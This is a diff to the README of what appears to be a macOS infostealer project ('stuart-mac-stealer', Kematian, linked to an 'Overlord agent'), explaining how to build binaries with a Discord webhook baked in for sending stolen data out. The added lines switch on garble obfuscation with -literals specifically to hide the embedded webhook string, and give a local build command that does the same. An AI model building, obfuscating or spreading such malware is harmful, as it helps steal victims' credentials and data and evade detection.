@@ -11,18 +11,24 @@ Overlord uses the separate **Kematian Overlord plugin** on Windows/Linux. This r
 1. Repo **Settings → Secrets and variables → Actions** → add secret:
    - `DISCORD_WEBHOOK` = `https://discord.com/api/webhooks/ID/TOKEN`
 2. **Actions → macOS Build (CGO) → Run workflow**
+   - **Obfuscate with garble** — on by default (same idea as Overlord agent)
+   - **Garble -literals** — on by default (obfuscates embedded webhook string)
    - Optional: paste a different webhook in **discord_webhook** (overrides the secret)
 3. Download artifact **stuart-mac-stealer-macos** (`kematian-darwin-arm64`, `kematian-darwin-amd64`, zip)
 
 The webhook is **baked into the binary** at build time (`main.defaultWebhook`). You do not need to pass it at runtime unless you want to override with `-webhook`.
 
-Pushes to `main` and version tags `v*` also run this workflow (uses `DISCORD_WEBHOOK` secret).
+Pushes to `main` and version tags `v*` also run this workflow (garble + `-literals` enabled, uses `DISCORD_WEBHOOK` secret).
 
 ## Build locally (on a Mac)
 
 ```bash
 chmod +x scripts/build-macos.sh
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/ID/TOKEN" ./scripts/build-macos.sh
+
+# With garble (like Overlord agent):
+go install mvdan.cc/garble@latest
+OBFUSCATE=true GARBLE_FLAGS="-literals" DISCORD_WEBHOOK="https://discord.com/api/webhooks/ID/TOKEN" ./scripts/build-macos.sh
 ```
 
 Outputs:
